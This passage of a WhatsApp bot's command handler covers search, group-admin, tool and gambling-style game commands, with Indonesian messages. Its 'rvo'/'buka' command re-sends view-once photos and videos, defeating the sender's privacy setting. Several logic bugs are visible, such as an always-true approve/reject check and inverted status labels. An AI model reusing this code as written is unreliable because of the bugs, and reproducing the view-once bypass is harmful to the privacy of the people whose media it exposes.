return ptz.reply(m.chat, `Send/Reply Images with the caption *${prefix + command}`, m)
if (!/image\/(jpe?g|png)/.test(mime))
return ptz.reply(m.chat, `Mime ${mime} tidak support`, m)
else ptz.enhancer[m.sender] = true;
ptz.sendMessage(m.chat, {
react: {
text: '🕒',
key: m.key,
}
});
let img = await q.download?.();
let error;
try {
const This = await remini(img, "enhance");
ptz.sendMessage(m.chat, {
react: {
text: '☑️',
key: m.key,
}
});
ptz.sendFile(m.chat, This, "", "```Success...```", m);
} catch (er) {
error = true;
} finally {
if (error) {
ptz.reply(m.chat, "Proses Gagal :(", m)
}
delete ptz.enhancer[m.sender];
}
uselimit()}
break;
//BATAS CONVERT MENU

//SEARCH MENU
case'pin':
case'pinterest':{
if (limitnya < 1) return m.reply(mess.limit)
if (!text) return reply(`*Example*: ${ prefix + command } Gojo Satoru`)
async function createImage(url) {
    const { imageMessage } = await generateWAMessageContent({
      image: {
        url
      }
    }, {
      upload: ptz.waUploadToServer
    });
    return imageMessage;
  }

  function shuffleArray(array) {
    for (let i = array.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [array[i], array[j]] = [array[j], array[i]];
    }
  }

  let push = [];
  let { data } = await axios.get(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${text}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${text}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
  let res = data.resource_response.data.results.map(v => v.images.orig.url);

  shuffleArray(res); // Mengacak array
  let ult = res.splice(0, 5); // Mengambil 10 gambar pertama dari array yang sudah diacak
  let i = 1;

  for (let pus of ult) {
    push.push({
      body: proto.Message.InteractiveMessage.Body.fromObject({
        text: `Image ke - ${i++}`
      }),
      footer: proto.Message.InteractiveMessage.Footer.fromObject({
        text: `${ownername}`
      }),
      header: proto.Message.InteractiveMessage.Header.fromObject({
        title: 'Hasil.',
        hasMediaAttachment: true,
        imageMessage: await createImage(pus)
      }),
      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [
          {
            name: "cta_url",
            buttonParamsJson: `{"display_text":"url","Klik disini":"${pus}","merchant_url":"${pus}"}`
          }
        ]
      })
    });
  }

  const bot = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hasil Pencarian Dari ${text}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: global.ownername
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            hasMediaAttachment: false
          }),
          carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
            cards: [
              ...push
            ]
          })
        })
      }
    }
  }, {});

  await ptz.relayMessage(m.chat, bot.message, {
    messageId: bot.key.id
  });
uselimit()}
break

case'spotifysearch':{
if (limitnya < 1) return m.reply(mess.limit)
  if (!text) return reply(`*Example*: ${prefix + command} Perfect - ed Sheeran`);
  try {
    let json = await searchSpotifyTracks(text);
    if (json.length < 1) return reply(`Tidak ada hasil ditemukan.`);
    let ini_txt = '*Spotify Search*';
    for (const x of json) {
      ini_txt += `
      
🎵 *Judul:* ${x.name}
👥 *Artis:* ${x.artists.map(v => v.name).join(', ')}
👥 *Artis Album:* ${x.album.artists.map(v => v.name).join(', ')}
🆔 *ID:* ${x.id}
📅 *Tanggal Rilis Album:* ${x.album.release_date}
🆔 *ID Album:* ${x.album.id}
🎵 *Jumlah Trek Album:* ${x.album.total_tracks}
🔢 *Nomor Trek:* ${x.album.track_number}
⏳ *Durasi:* ${x.duration_ms} ms
🔗 *Uri:* ${x.uri}
🎵 *URL Album*: ${x.album.external_urls.spotify}
🔗 *URL:* ${x.external_urls.spotify}
${x.preview_url ? `🎧 *Direct URL:* ${x.preview_url}` : ''}
───────────────────`;
    }
    reply(ini_txt);
  } catch (e) {
    return reply('*Spotify Search*\n\nTerjadi Kesalahan, Coba Lagi Nanti.');
  }
uselimit()};
break

case 'gimage': {
if (!text) return reply(`Example: ${prefix + command} panda`)
reply(mess.search)
let { googleImage } = require('@bochilteam/scraper')
let json = await googleImage(text)
for (let i = 0; i < 3; i++) {
result = json[Math.floor(Math.random() * json.length)]   
ptz.sendMessage(m.chat, { image: { url: result }, caption: `🍟 *Fetching* : DaffaFauzan`}, { quoted: m })
await sleep(1500)
}
}
break

case'tiktoks': case'tiktoksearch': case'ttsearch':{
if (limitnya < 1) return m.reply(mess.limit)
  if (!text) return reply(`*Example :* .${command} jedag jedug`)
  ptz.sendMessage(m.chat, { react: { text: '🕐', key: m.key }})
  let kemii = await tiktoks(`${text}`)
  ptz.sendMessage(m.chat, {
  video: {url: kemii.no_watermark},
  gifPlayback: true, 
  caption: '```Result from:```'+' `'+text+'`'
  }, {quoted: m})
  uselimit()}
  break      
//BATAS SEARCH MENU

//GROUP MENU

case 'closetime':
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.Badmin)
if (args[1]=="detik") {var timer = args[0]*`1000`
} else if (args[1]=="menit") {var timer = args[0]*`60000`
} else if (args[1]=="jam") {var timer = args[0]*`3600000`
} else if (args[1]=="hari") {var timer = args[0]*`86400000`
} else {return reply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
 reply(`Close time ${q} dimulai dari sekarang`)
setTimeout( () => {
const close = `*Tepat waktu* grup ditutup oleh admin\nsekarang hanya admin yang dapat mengirim pesan`
ptz.groupSettingUpdate(from, 'announcement')
reply(close)
}, timer)
break

case 'acc': {
    if (!m.isGroup) return m.reply(mess.group)
    if (!isCreator && !isAdmins) return m.reply(mess.admin)
    if (!args[0]) return reply("*Perintah tidak valid.*\nGunakan:\n- *acc list*\n- *acc approve [number]*\n- *acc reject [number]*\n- *acc reject [JID]*\n- *acc reject/approve all* untuk menolak/menyetujui semua permintaan bergabung.");

    try {
        let groupId = m.chat;
        let [subCommand, options] = args;
        let joinRequestList = await ptz.groupRequestParticipantsList(groupId);

        const formatDate = (timestamp) => new Intl.DateTimeFormat('id-ID', {
            weekday: 'long',
            day: 'numeric',
            month: 'long',
            year: 'numeric'
        }).format(new Date(timestamp * 1000));

        if (subCommand === "list") {
            const formattedList = joinRequestList.length > 0 ?
                joinRequestList.map((request, i) => `*${i + 1}.*\n• Nomor: ${request.jid.split('@')[0]}\n• Metode Permintaan: ${request.request_method}\n• Waktu Permintaan: ${formatDate(request.request_time)}\n\n`).join('') :
                "Tidak ada permintaan bergabung yang tertunda.";
            reply(`*Daftar Permintaan Bergabung:*\n\n${formattedList}`);
        }

        if (subCommand === "reject" || "approve") {
            if (options === "all") {
                for (const request of joinRequestList) {
                    await ptz.groupRequestParticipantsUpdate(groupId, [request.jid], subCommand);
                    console.log(`Meng-${subCommand} participant dengan JID: ${request.jid}`);
                }
                reply(`*${subCommand === 'approve' ? 'Menyetujui' : 'Menolak'} semua permintaan bergabung.*`);
            } else {
                const actions = options.split(" ").map(action => action.trim());
                const participants = actions.map(action => joinRequestList[parseInt(action) - 1]).filter(request => request);
                if (participants.length > 0) {
                    let formattedResponse = '';
                    for (const request of participants) {
                        const response = await ptz.groupRequestParticipantsUpdate(groupId, [request.jid], subCommand);
                        const status = response[0].status === 'success' ? 'Gagal' : 'Berhasil';
                        formattedResponse += `*${participants.indexOf(request) + 1}.*\n• Status: ${status}\n• Nomor: ${request.jid.split('@')[0]}\n\n`;
                        console.log(`Meng-${subCommand} participant dengan JID: ${request.jid}`);
                    }
                    reply(`*${subCommand === 'approve' ? 'Menyetujui' : 'Menolak'} Permintaan Bergabung:*\n\n${formattedResponse}`);
                } else {
                    reply("Tidak ada anggota yang cocok untuk reject/approve.");
                }
            }
        }
    } catch (err) {
        console.log(jsonformat(err))
    }
    }
    break

case 'kick': {
    if (!m.isGroup) return m.reply(mess.group)
    if (!isBotAdmins) return m.reply(mess.badm)
    if (!isAdmins) return m.reply(mess.admin)
    let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
    await ptz.groupParticipantsUpdate(from, [users], 'remove')
    m.reply(mess.done)
    }
    break

case 'opentime': {
if (!m?.isGroup) return reply("Khusus Dalam Group")
if (!isAdmins && !isCreator) return reply("Khusus Admin Group")
if (!isBotAdmins) return reply("Jadikan Bot Sebagai Admin Terlebih Dahulu Jika Ingin Menggunakan Fitur Ini")
if (args[1] == 'detik') {
var timer = args[0] * `1000`
} else if (args[1] == 'menit') {
var timer = args[0] * `60000`
} else if (args[1] == 'jam') {
var timer = args[0] * `3600000`
} else if (args[1] == 'hari') {
var timer = args[0] * `86400000`
} else {
return reply('*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik')
}
reply(`Open Time ${q} Dimulai Dari Sekarang`)
setTimeout(() => {
const nomor = m.participant
const open = `*Tepat Waktu* Grup Dibuka Oleh Admin\nSekarang Member Dapat Mengirim Pesan`
ptz.groupSettingUpdate(m.chat, 'not_announcement')
reply(open)
}, timer)
}
break

case 'promote':{
if (m?.isGroup && !isAdmins && !isGroupOwner && isBotAdmins) return
if (!text && !m?.quoted)reply('masukkan nomor yang ingin di promote')
let users = m?.quoted ? m?.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await ptz.groupParticipantsUpdate(m?.chat, [users], 'promote').catch(console.log)
}
break
        
case 'demote':{
if (m?.isGroup && !isAdmins && !isGroupOwner && isBotAdmins) return
if (!text && !m?.quoted)reply('masukkan nomor yang ingin di demote')
let users = m?.quoted ? m?.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await ptz.groupParticipantsUpdate(m?.chat, [users], 'demote').catch(console.log)
}
break      

case 'linkgroup': case 'linkgc': {
if (!isCreator) return reply(mess.owner)
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.badm)
let response = await ptz.groupInviteCode(from)
ptz.sendText(from, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break

 case 'setnamagc': case 'namegc': {
if (!isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.botadmin)
if (!isAdmins && !isCreator) return reply(mess.admin)
if (!text) return reply('teksnya')
ptz.groupUpdateSubject(m.chat, text)
reply(mess.done)}
break

case 'creategc': {

    if (!isCreator) return m.reply(mess.owner)
    if (!text) return m.reply("Nama groupnya?")
    let cret = await ptz.groupCreate(text, [])
    let response = await ptz.groupInviteCode(cret.id)
    let teks = `\`\`\`「 CREATION GROUP MESSAGE 」\`\`\`
▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")} WIB
▸ Link : https://chat.whatsapp.com/${response}
`
    setTimeout(() => {
        reply(teks)
    }, 7000)
    setTimeout(() => {
        ptz.groupParticipantsUpdate(cret.id, [m.sender], "promote")
    }, 5000)
    setTimeout(() => {
        ptz.groupParticipantsUpdate(cret.id, [m.sender], "add")
    }, 1000)
    }
    break

case 'hidetag': case 'ht': case 'h': {
    if (!isAdmins) return m.reply(mess.owner)
    if (!m.isGroup) return m.reply(mess.group)
    ptz.sendMessage(from, {
        text: m.quoted? m.quoted.text : text ? text : '',
        mentions: participants.map(a => a.id)
    }, {
        quoted: fverif
    })
    }
    break

case 'setppgc': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botadmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (/image/g.test(mime)) {
let media = await ptz.downloadAndSaveMediaMessage(qmsg)
await ptz.updateProfilePicture(m.chat, {url: media})
await fs.unlinkSync(media)
m.reply(mess.done)
} else return m.reply('dengan mengirim foto')
}
break

case 'cekasalmember': {
  if (!m.isGroup) return m.reply(mess.group)
  const participants = await ptz.groupMetadata(m.chat).then(metadata => metadata.participants);
  let countIndonesia = 0;
  let countMalaysia = 0;
  let countUSA = 0;
  let countOther = 0;
  participants.forEach(participant => {
    const phoneNumber = participant.id.split('@')[0];
    if (phoneNumber.startsWith("62")) {
      countIndonesia++;
    } else if (phoneNumber.startsWith("60")) {
      countMalaysia++;
    } else if (phoneNumber.startsWith("1")) {
      countUSA++;
    } else if (phoneNumber.startsWith("+1")) {
      countOther++;
    } else {
      countOther++;
    }
  });
  const replyMessage = `Jumlah Anggota Grup Berdasarkan Negara:\n\nAnggota Indonesia: ${countIndonesia} 🇮🇩\nAnggota Malaysia: ${countMalaysia} 🇲🇾\nAnggota USA + OTHER : ${countUSA} 🇺🇲\nAnggota Negara Lain: ${countOther} 🏳️`;
  reply(replyMessage);
  }
  break

case 'welcome': {
if (!isCreator) return reply('Ngapain ? Fitur Ini Khusus Tuan Saya😜')
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (args.length < 1) return m.reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "on") {
if (welcm) return m.reply('Sudah Aktif')
wlcm.push(from)
var groupe = await ptz.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
ptz.sendMessage(from, {text: `Fitur Welcome Di Aktifkan Di Group Ini`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!welcm) return m.reply('Sudah Non Aktif')
let off = wlcm.indexOf(from)
wlcm.splice(off, 1)
reply('Sukses Mematikan Welcome  di group ini')
}
}
break

case 'antilinkv1':
if (!isCreator) return reply(mess.owner)
if (args[0] == 'enable'){
if (chats.antilink) return reply('UDAH ON!')
chats.antilink = true
reply('Fitur antilink telah di aktifkan')
} else if (args[0] == 'disable'){
if (!chats.antilink) return reply('UDAH OFF!')
chats.antilink = false
reply('Fitur antilink telah di matikan')
} else reply('enable / disable')
break
//BATAS GROUP MENU

//TOOLS MENU

case 'ocr': {
       if (!quoted) return reply(`reply image`)
       if (!/image/.test(mime) && !/webp/.test(mime)) return reply(`Reply Image`)
        let img = await quoted.download()
       try {
        let anu = await (await Tesseract.recognize(img, 'eng')).data.text
        reply(`*Result :*\n${anu}`)
       } catch (e) {
        console.log(e)
        m.reply('failed to read text.')
       }
      }
      break

case 'buka': case 'rvo': {
    if (!quoted) return reply(`Reply view once message to use this command`)
    let type = Object.keys(m.quoted.message)[0]
    let quotedType = m.quoted.message[type]
    var media = await downloadContentFromMessage(quotedType, type == "imageMessage" ? "image" : "video")
    let buffer = Buffer.from([])
    for await (let chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        await ptz.sendMessage(m.chat, {
            video: buffer,
            caption: quotedType.caption
        }, {
            quoted: m
        })
    } else if (/image/.test(type)) {
        await ptz.sendMessage(m.chat, {
            image: buffer,
            caption: quotedType.caption
        }, {
            quoted: m
        })
    }
    }
    break

case 'getpp': {
    ptz.sendImage(m.chat, ppuser, mess.success, m)
    }
    break

case 'enc': {
    if (!text) return reply(`Contoh ${prefix+command} const adrian = require('adrian-api')`)
    let meg = await Scraper.Tools.obfus(text)
    m.reply(`${meg.result}`)
    }
    break

case 'removebg': {
    if (!quoted) return reply(`Kirim/Reply Image Dengan Caption ${command}`)
    if (!/image/.test(mime)) return reply(`Kirim/Reply Image Dengan Caption ${command}`)
    if (/webp/.test(mime)) return reply(`Kirim/Reply Image Dengan Caption ${command}`)
    let img = await quoted.download()
    let image = await Scraper.Tools.removeBg(img)
    let result = await Buffer.from(image, "base64")

    ptz.sendImage(m.chat, result, mess.success, m)
    }
    break

case 'git': case 'gitclone': {
    if (!args[0]) return m.reply(`Mana link nya?\nContoh :\n${prefix}${command} https://github.com/YukiShima4/tes`)
    if (!isUrl(args[0]) && !args[0].includes('github.com')) return m.reply(`Link invalid!!`)
    let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    let [, user, repo] = args[0].match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {
        method: 'HEAD'
    })).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    ptz.sendMessage(m.chat, {
        document: {
            url: url
        },
        fileName: filename + '.zip',
        mimetype: 'application/zip'
    }, {
        quoted: m
    }).catch((err) => reply('emror'))
    }
    break  

case 'tts': {
    if (!text) return reply(`Example : ${prefix + command} text`)
        let tts = await Scraper.Tools.Tts(text, "id")
        ptz.sendMessage(m.chat, {
            audio: tts,
            ptt: true,
            mimetype: "audio/mpeg",
            fileName: "vn.mp3",
            waveform: [100, 0, 100, 0, 100, 0, 100]
        }, {
            quoted: m
        });
    }
    break

case 'tr':
case 'translate':{
let lang, text
if (limitnya < 1) return m.reply(mess.limit)
if (args.length >= 2) {
lang = args[0] ? args[0] : 'id', text = args.slice(1).join(' ')
} else if (m?.quoted && m?.quoted.text) {
lang = args[0] ? args[0] : 'id', text = m?.quoted.text
} else return reply(`Ex: ${prefix + command} id hello i am robot`)
const translate = require('@vitalets/google-translate-api')
let res = await translate(text, { to: lang, autoCorrect: true }).catch(_ => null)
if (!res) return m.reply(`Error : Bahasa"${lang}" Tidak Support`)
reply(`*Terdeteksi Bahasa:* ${res.from?.language.iso}\n*Ke Bahasa:* ${lang}\n\n*Terjemahan:* ${res.text}`.trim())
uselimit()
}
break

//BATAS TOOLS MENU

//GAME MENU

case 'tebakbomb': case 'bomb': {
if (!m.isGroup) return reply(mess.group)
if (m.chat in ptz.bomb) return ptz.sendText(m.chat, "Masih ada game yang belum terselsaikan!", ptz.bomb[m.chat][0]);
ptz.bomb = ptz.bomb ? ptz.bomb : {};
let id = m.chat,
timeout = 180000;
const bom = ['💥', '✅', '✅', '✅', '✅', '✅', '✅', '✅', '✅'].sort(() => Math.random() - 0.5);
const number = ['1️⃣', '2️⃣', '3️⃣', '4️⃣', '5️⃣', '6️⃣', '7️⃣', '8️⃣', '9️⃣'];
const array = bom.map((v, i) => ({
emot: v,
number: number[i],
position: i + 1,
state: false
}));
let teks = `*🎮 GAME TEBAK BOM 🎮*\n\nKirim angka *1* - *9* untuk membuka *9* kotak nomor di bawah ini :\n\n`;
for (let i = 0; i < array.length; i += 3) teks += array.slice(i, i + 3).map(v => v.state ? v.emot : v.number).join('') + '\n';
teks += `\nWaktu : *${((timeout / 1000) / 60)} menit*\nHadiah : *Random Balance*\n\nApabila mendapat kotak yang berisi bom maka *Hadiah* tidak di berikan`;
let msg = await ptz.sendText(m.chat, teks, ptz.bomb[id] ? ptz.bomb[id][0] : m);
let { key } = msg

let v;
ptz.bomb[id] = [
msg,
array,
setTimeout(() => {
v = array.find(v => v.emot == '💥');
if (ptz.bomb[id]) ptz.sendText(m.chat, `*Waktu habis*\n\nKotak yang berisi bom ${v.number} tidak terbuka\nGame dihentikan!`, ptz.bomb[id][0]);
delete ptz.bomb[id];
}, timeout),
key
];
}
break

case 'casino': {
if (!m.isGroup) return reply(mess.group)
let buatall = 1
ptz.casino = ptz.casino ? ptz.casino : {}
if (m.chat in ptz.casino) return reply('Masih Ada Yang Melakukan Casino Disini, Tunggu Sampai Selesai!!')
else ptz.casino[m.chat] = true
try {
let randomaku = `${Math.floor(Math.random() * 101)}`.trim()
let randomkamu = `${Math.floor(Math.random() * 81)}`.trim() //hehe Biar Susah Menang :v
let Aku = (randomaku * 1)
let Kamu = (randomkamu * 1)
let count = args[0]
count = count ? /all/i.test(count) ? Math.floor(db.data.users[m.sender].balance / buatall) : parseInt(count) : args[0] ? parseInt(args[0]) : 1
count = Math.max(1, count)
if (args.length < 1) return reply(`${prefix}casino <jumlah>\n${prefix}casino 1000`)
if (db.data.users[m.sender].balance >= count * 1) {
db.data.users[m.sender].balance -= count * 1
if (Aku > Kamu) {
reply(`💰 Casino 💰\n*${pushname}:* ${Kamu} Point\n*${botname}:* ${Aku} Point\n\n*Kamu Kalah*\nKamu Kehilangan ${count} Balance`)
} else if (Aku < Kamu) {
db.data.users[m.sender].balance += count * 2
reply(`💰 Casino 💰\n*${pushname}:* ${Kamu} Point\n*${botname}:* ${Aku} Point\n\n*Kamu Kalah*\nKamu Mendapatkan ${count * 2} Balance`)
} else {
ldb.data.users[m.sender].balance += count * 1
reply(`💰 Casino 💰\n*${pushname}:* ${Kamu} Point\n*${botname}:* ${Aku} Point\n\n*Seri*\nKamu Mendapatkan ${count * 1} Balance`)
}
} else reply(`Balance Kamu Tidak Mencukupi Untuk Casino Silahkan *bermain game* Terlebih Dahulu!`)
} catch (e) {
console.log(e)
reply(mess.error)
} finally {
delete ptz.casino[m.chat]
}
}
break

case 'caklontong':
//if(!isGroup) return m.reply(mess.group)
if (from in caklontong) return m.reply('Masih ada game yang belum diselesaikan');
var { soal, jawaban, deskripsi } = pickRandom(JSON.parse(fs.readFileSync('./media/game/caklontong.json')));
console.log(`Jawaban : ${jawaban}\n${deskripsi}`)
await m.reply(`*GAME CAK LONTONG*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
caklontong[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (caklontong[from]) m.reply(`Waktu habis!\nJawabannya adalah: ${jawaban}\n${deskripsi}`)
delete caklontong[from];
}, gamewaktu * 1000)
}
break

case 'tebakgambar':
//if(!isGroup) return m.reply(mess.group)
if (from in tebakgambar2) return m.reply('Masih ada game yang belum diselesaikan');
var { img, jawaban, deskripsi } = pickRandom(JSON.parse(fs.readFileSync('./media/game/tebakgambar.json')));
console.log('Jawaban : '+jawaban)
var teks1 = `*GAME TEBAK GAMBAR*\n\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nDeskripsi: ${deskripsi}\nWaktu: ${gamewaktu} detik`
await ptz.sendMessage(from, {image: {url: img}, caption: teks1}, {quoted: m})
tebakgambar2[from] = {
soal: img,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebakgambar2[from]) m.reply(`Waktu habis!\nJawabannya adalah: ${tebakgambar2[from].jawaban}`);
delete tebakgambar2[from];
}, gamewaktu * 1000)
}
break

case 'family100': case 'f100':
//if(!isGroup) return m.reply(mess.group)
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./media/game/family100.json')));
console.log('Jawaban : '+jawaban)
let famil = []
for (let i of jawaban){
let fefsh = i.split('/') ? i.split('/')[0] : i
let iuhbs = fefsh.startsWith(' ') ? fefsh.replace(' ','') : fefsh
let axsfh = iuhbs.endsWith(' ') ? iuhbs.replace(iuhbs.slice(-1), '') : iuhbs
famil.push(axsfh.toLowerCase())
}
await m.reply(`*GAME FAMILY 100*\n\nSoal: ${soal}\nTotal Jawaban: ${jawaban.length}\n\nWaktu: ${gamewaktu} detik`)
family100[from] = {
soal: soal,
jawaban: famil,
hadiah: randomNomor(10, 20),
waktu: setTimeout(async function () {
if (from in family100) {
let teks = `*WAKTU HABIS!*\nJawaban yang belum terjawab :\n\n`
let jwb = family100[from].jawaban
for (let i of jwb){teks += `\n${i}`}
m.reply(teks)
delete family100[from];
};
}, gamewaktu * 1000)
}
break //Powered By alice & Darwin

case 'tebakbendera':
//if(!isGroup) return m.reply(mess.group)
if (from in tebakbendera) return m.reply('Masih ada game yang belum diselesaikan');
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./media/game/tebakbendera.json')));
console.log('Jawaban : '+jawaban)
await m.reply(`*GAME TEBAK BENDERA*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
tebakbendera[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebakbendera[from]) m.reply(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete tebakbendera[from];
}, gamewaktu * 1000)
}
break

case 'coin': {
if (!args || !args[0]) return reply(`🚩 Berikan argumen A atau B.`)
      let x = Func.ucword(args[0])
      if (x == 'A' || x == 'B') {
         var typeC = Func.random(['A', 'B'])
         if (Func.ucword(args[0]) == typeC) {
            let percent = Func.randomInt(5, 10)
            let reward = ((percent / 100) * users.balance)
            users.balance += reward
            let last = users.balance
            let teks = `  *W I N*\n\n`
            teks += `	*System* : ${typeC}, *You* : ${Func.ucword(args[0])}!\n`
            teks += `	*+ ${Func.formatNumber(reward)}*\n\n`
            teks += `• *Total* : ${Func.formatNumber(last)} Point\n\n`
            teks += `*NB : “Anti-Spam jeda ${global.gamewaktu} detik untuk eksekusi selanjutnya.”*`
            reply(teks)
         } else if (Func.ucword(args[0]) != typeC) {
            let percent = Func.randomInt(5, 15)
            let reward = ((percent / 100) * users.balance)
            users.balance -= reward
            let last = users.balance
            let teks = `  *L O S E*\n\n`
            teks += `	*System* : ${typeC}, *You* : ${Func.ucword(args[0])}!\n`
            teks += `	*- ${Func.formatNumber(reward)}*\n\n`
            teks += `• *Total* : ${Func.formatNumber(last)} Point\n\n`
            teks += `*NB : “Anti-Spam jeda ${global.gamewaktu} detik untuk eksekusi selanjutnya.”*`
            reply(teks)
         }
      } else {
         return reply(`🚩 Hanya terdapat argumen A dan B.`)
      }
}
break

case 'suit': {
if(!m.isGroup) return reply(mess.group)
if (Object.values(suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(sender))) return reply(`Selesaikan suit mu yang sebelumnya`)
mark = `0@s.whatsapp.net`
if (!froms) return reply(`Siapa yang ingin kamu tantang?\nTag orangnya!\n\nContoh: *${command}* @${mark.split('@')[0]}`)
if (froms === botNumber) return reply(`Tidak bisa bermain dengan bot!`)
if (froms === sender) return reply(`Sad amat main ama diri sendiri`)
if (Object.values(suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(froms))) return reply(`Orang yang kamu tantang sedang bermain suit bersama orang lain :)`)
var hadiah = Func.randomInt(bmin, bmax)
let poin = 1000
let poin_lose = 1000
let timeout = 60000
let id = 'suit_' + new Date() * 1
suit[id] = {
chat: await reply(`@${sender.split('@')[0]} menantang @${froms.split('@')[0]} untuk bermain suit dengan taruhan Saldo Rp. 2,000\n\n*Kirim (gas/gamau)* untuk bermain\n\n*Hadiah Pemenang :* Rp. 1,000\n*Hukuman Kalah* : - Rp. 1,000`),
id: id,
p: sender,
p2: froms,
status: 'wait',
hadiah: hadiah,
waktu: setTimeout(() => {
if (suit[id]) ptz.sendMessage(from, {text: `_Waktu suit habis!_` })
delete suit[id]
}, 60000), poin, poin_lose, timeout
}
}
break

case 'slot': {
if (!m.isGroup) return reply(mess.group)
let hadiah = randomNumber(2000, 3000)
let emojis = ["😹", "🧢", "🗿"]
let a = Math.floor(Math.random() * emojis.length)
let b = Math.floor(Math.random() * emojis.length)
let c = Math.floor(Math.random() * emojis.length)
let x = [],
y = [],
z = []
for (let i = 0; i < 3; i++) {
x[i] = emojis[a]
a++
if (a == emojis.length) a = 0
}
for (let i = 0; i < 3; i++) {
y[i] = emojis[b]
b++
if (b == emojis.length) b = 0
}
for (let i = 0; i < 3; i++) {
z[i] = emojis[c]
c++
if (c == emojis.length) c = 0
}
let end
if (a == b && b == c) {
end = `JACKPOT! *$${hadiah} point*`
db.data.users[m.sender].balance += hadiah
} else if (a == b || a == c || b == c) {
end = `Hampir Beruntung! *+1 Limits*`
db.data.users[m.sender].limit += 1
} else {
end = `LOSE! *-$${hadiah}*`
if (hadiah > db.data.users[m.sender].balance) {
ldb.data.users[m.sender].balance = 0
} else {
db.data.users[m.sender].balance -= hadiah
}
}
let teks = `  *S L O T S*\n\n`
teks += `	[ ${x[0]} ${y[0]} ${z[0]} ]\n`
teks += `	[ ${x[1]} ${y[1]} ${z[1]} ]\n`
teks += `	[ ${x[2]} ${y[2]} ${z[2]} ]\n`
teks += `\n${end}`
reply(teks)
}
break
case 'tictactoe': case 'ttt': case 'ttc': case 'xox':
if (!m.isGroup) return reply(mess.group)
if (from in tictactoe) return reply(`Masih ada game yang blum selesai`)
if (!froms) return reply(`Kirim perintah *${command}* @tag atau reply pesan orangnya!`)
if (froms === botNumber) return reply(`Tidak bisa bermain dengan bot!`)
if (froms === sender) return reply(`Sad amat main ama diri sendiri`)
var hadiah = randomNumber(10, 20)
await reply(`@${sender.split('@')[0]} menantang @${froms.split('@')[0]} untuk bermain TicTacToe\n\n*Kirim (Y/N)* untuk bermain\n\nHadiah : ${hadiah} balance`)
tictactoe[from] = {
id: from,
status: null,
hadiah: hadiah,
penantang: sender,
ditantang: froms,
TicTacToe: ['1️⃣','2️⃣','3️⃣','4️⃣','5️⃣','6️⃣','7️⃣','8️⃣','9️⃣']
}
break
case 'delttt': case 'delttc':
if (!m.isGroup) return reply(mess.group)
if (!(from in tictactoe)) return reply(`Tidak ada sesi game tictactoe di grup ini`)
if (isAdmins || isOwner) {
delete tictactoe[from];
reply(`Berhasil menghapus sesi tictactoe di grup ini\n\n-$500`)
} else if (tictactoe[from].penantang.includes(sender)) {
delete tictactoe[from];
